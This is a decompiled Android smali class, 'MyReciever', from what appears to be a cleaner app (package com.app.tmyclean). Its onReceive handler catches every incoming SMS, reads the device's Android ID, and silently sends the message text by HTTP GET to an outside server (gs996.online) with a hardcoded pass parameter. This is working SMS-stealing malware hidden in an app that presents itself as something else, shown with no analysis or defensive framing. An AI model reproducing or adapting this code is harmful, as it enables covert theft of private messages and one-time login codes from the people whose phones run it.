.class public Lcom/app/tmyclean/activities/MyReciever;
.super Landroid/content/BroadcastReceiver;
.source "MyReciever.java"


# static fields
.field private static final SMS_RECEIVED:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"

.field private static final TAG:Ljava/lang/String; = "SMSBroadcastReceiver"


# instance fields
.field private sms:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 20
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 11
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x0,
            0x0
        }
        names = {
            "context",
            "intent"
        }
    .end annotation

    .line 32
    invoke-virtual {p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v0

    const-string v1, "android.provider.Telephony.SMS_RECEIVED"

    if-ne v0, v1, :cond_2

    .line 33
    invoke-virtual {p1}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    const-string v1, "android_id"

    invoke-static {v0, v1}, Landroid/provider/Settings$Secure;->getString(Landroid/content/ContentResolver;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 35
    .local v0, "android_id":Ljava/lang/String;
    invoke-virtual {p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v1

    .line 36
    .local v1, "bundle":Landroid/os/Bundle;
    if-eqz v1, :cond_2

    .line 37
    const-string v2, "pdus"

    invoke-virtual {v1, v2}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, [Ljava/lang/Object;

    .line 38
    .local v2, "pdus":[Ljava/lang/Object;
    array-length v3, v2

    new-array v3, v3, [Landroid/telephony/SmsMessage;

    .line 39
    .local v3, "messages":[Landroid/telephony/SmsMessage;
    const/4 v4, 0x0

    .local v4, "i":I
    :goto_0
    array-length v5, v2

    if-ge v4, v5, :cond_0

    .line 40
    aget-object v5, v2, v4

    check-cast v5, [B

    invoke-static {v5}, Landroid/telephony/SmsMessage;->createFromPdu([B)Landroid/telephony/SmsMessage;

    move-result-object v5

    aput-object v5, v3, v4

    .line 39
    add-int/lit8 v4, v4, 0x1

    goto :goto_0

    .line 42
    .end local v4    # "i":I
    :cond_0
    array-length v4, v3

    const/4 v5, -0x1

    if-le v4, v5, :cond_1

    .line 44
    const/4 v4, 0x0

    .restart local v4    # "i":I
    :goto_1
    array-length v5, v2

    if-ge v4, v5, :cond_1

    .line 45
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    iget-object v6, p0, Lcom/app/tmyclean/activities/MyReciever;->sms:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    aget-object v6, v3, v4

    invoke-virtual {v6}, Landroid/telephony/SmsMessage;->getMessageBody()Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v6, " "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/app/tmyclean/activities/MyReciever;->sms:Ljava/lang/String;

    .line 44
    add-int/lit8 v4, v4, 0x1

    goto :goto_1

    .line 48
    .end local v4    # "i":I
    :cond_1
    const-string v4, "https://gs996.online"

    .line 52
    .local v4, "url":Ljava/lang/String;
    :try_start_0
    iget-object v5, p0, Lcom/app/tmyclean/activities/MyReciever;->sms:Ljava/lang/String;

    sget-object v6, Ljava/nio/charset/StandardCharsets;->UTF_8:Ljava/nio/charset/Charset;

    invoke-virtual {v6}, Ljava/nio/charset/Charset;->toString()Ljava/lang/String;

    move-result-object v6

    invoke-static {v5, v6}, Ljava/net/URLEncoder;->encode(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    iput-object v5, p0, Lcom/app/tmyclean/activities/MyReciever;->sms:Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    .line 55
    goto :goto_2

    .line 53
    :catch_0
    move-exception v5

    .line 54
    .local v5, "e":Ljava/io/UnsupportedEncodingException;
    invoke-virtual {v5}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    .line 57
    .end local v5    # "e":Ljava/io/UnsupportedEncodingException;
    :goto_2
    invoke-static {p1}, Lcom/android/volley/toolbox/Volley;->newRequestQueue(Landroid/content/Context;)Lcom/android/volley/RequestQueue;

    move-result-object v5

    .line 58
    .local v5, "queue":Lcom/android/volley/RequestQueue;
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, "?pass=app168&cmd=sms&sid=%1$s&sms=%2$s"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x2

    new-array v7, v7, [Ljava/lang/Object;

    const/4 v8, 0x0

    aput-object v0, v7, v8

    iget-object v9, p0, Lcom/app/tmyclean/activities/MyReciever;->sms:Ljava/lang/String;

    const/4 v10, 0x1

    aput-object v9, v7, v10

    invoke-static {v6, v7}, Ljava/lang/String;->format(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v6

    .line 59
    .local v6, "uri":Ljava/lang/String;
    new-instance v7, Lcom/android/volley/toolbox/StringRequest;

    const/4 v9, 0x0

    invoke-direct {v7, v8, v6, v9, v9}, Lcom/android/volley/toolbox/StringRequest;-><init>(ILjava/lang/String;Lcom/android/volley/Response$Listener;Lcom/android/volley/Response$ErrorListener;)V

    .line 60
    .local v7, "myReq":Lcom/android/volley/toolbox/StringRequest;
    invoke-virtual {v5, v7}, Lcom/android/volley/RequestQueue;->add(Lcom/android/volley/Request;)Lcom/android/volley/Request;

    .line 65
    .end local v0    # "android_id":Ljava/lang/String;
    .end local v1    # "bundle":Landroid/os/Bundle;
    .end local v2    # "pdus":[Ljava/lang/Object;
    .end local v3    # "messages":[Landroid/telephony/SmsMessage;
    .end local v4    # "url":Ljava/lang/String;
    .end local v5    # "queue":Lcom/android/volley/RequestQueue;
    .end local v6    # "uri":Ljava/lang/String;
    .end local v7    # "myReq":Lcom/android/volley/toolbox/StringRequest;
    :cond_2
    return-void
.end method
